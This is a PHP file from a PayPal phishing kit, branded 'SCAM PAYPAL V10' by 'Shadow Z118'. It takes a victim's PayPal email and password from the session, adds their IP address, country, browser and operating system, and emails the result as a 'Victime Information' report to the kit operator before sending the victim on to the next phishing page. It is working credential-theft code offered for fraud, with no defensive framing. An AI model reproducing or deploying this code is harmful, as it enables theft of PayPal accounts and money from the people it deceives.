<?php
/*   
   _____   _                   _                        ______    __    __     ___  
  / ____| | |                 | |                      |___  /   /_ |  /_ |   / _ \ 
 | (___   | |__     __ _    __| |   ___   __      __      / /    | |   | |   | (_) |
  \___ \  | '_ \   / _` |  / _` |  / _ \  \ \ /\ / /     / /   - | | - | | -  > _ < 
  ____) | | | | | | (_| | | (_| | | (_) |  \ V  V /     / /__  - | | - | | - | (_) |
 |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     /_____|   |_|   |_|    \___/ 
                                                                                
                              #=======================#
                              #    SCAM PAYPAL V10    #
                              #      SHADOW Z118      #
                              #=======================#
							  
                $$$$$$$\                     $$$$$$$\           $$\   
                $$  __$$\                    $$  __$$\          $$ |  
                $$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |  
                $$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |  
                $$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |  
                $$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |  
                $$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |  
                \__|      \_______| \____$$ |\__|      \_______|\__|  
                                   $$\   $$ |                         
                                   \$$$$$$  |                         
                                    \______/                          
*/

session_start();
$time = date('d/m/Y G:i:s');
include('../config.php');
include('../get_browser.php');
$S_Z118 .= "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
<div style=' margin-bottom: 2px;'>
<span style='font-size: 15px;'>################</span> <font style='color: #DF0000;' ><img src=\"http://img15.hostingpics.net/pics/951888ppl.png\" style='position: relative;top: 8px;'></font> <span style='font-size: 15px;'>####################</span></div>
<div>
<span> ±±±±±±±±±±±±±±±±[ <font color='#0070ba' style='font-size: 13px;'>Login Information</font> <span> ]±±±±±±±±±±±±±±±±±±±±±<br></span></span></div>
<span style='color: #00B514'>℗</span><span> [PP Email]&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;</span>
<font style='color: rgb(255, 59, 35);'>".$_SESSION['_login_email_']."</font><br>
<span style='color: #00B514'>℗</span><span> [PP Password] = </span>
<font style='color: rgb(255, 59, 35);'>&nbsp;".$_SESSION['_login_password_']."</font><br>

<div>
<span> ±±±±±±±±±±±±±±±±[ <font style='color:#0070ba;font-size: 13px;'>Victime Information</font> <span> ]±±±±±±±±±±±±±±±±±±±<br></span></span></div>

<span>›</span><span> [IP INFO]&nbsp;= </span><font><a style='color: rgb(255, 59, 35); text-decoration: initial;' href=\"https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."\">https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</a></font>
<span style='color: #00B514'>℗</span><span> [Country]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= </span>
<font style='color: rgb(255, 59, 35);'>&nbsp;".$_SESSION['_countryname_']."</font><br>
<span>›</span><span> [TIME]&nbsp;&nbsp;&nbsp;&nbsp;= </span><font style='color: rgb(255, 59, 35);'>".$time." </font><br>
<span>›</span><span> [BROWSER]&nbsp;= </span><font style='color: rgb(255, 59, 35);'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br><div style=' margin-bottom: 2px;'>
<span style='font-size: 15px;'>################</span><font color='#0070ba' style='font-size: 14px;'> By Shadow Z-1-1-8 </font><span style='font-size: 15px;'>################</span></div></div>
</html>\n";
$subject = "Akashi ^_^ | PP L0g In [".$_SESSION['_countrycode_']."] [".$_SESSION['_ip_']."]";
$headers = "From:SHADOW Z.1.1.8 <result@log.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=UTF-8\n";

@mail($email,$subject,$S_Z118,$headers);
		header("Location: ../websc_info/?websc=_session=".$_SESSION[_countrycode_]."&".md5(microtime())."&dispatch=".sha1(microtime())."");
?>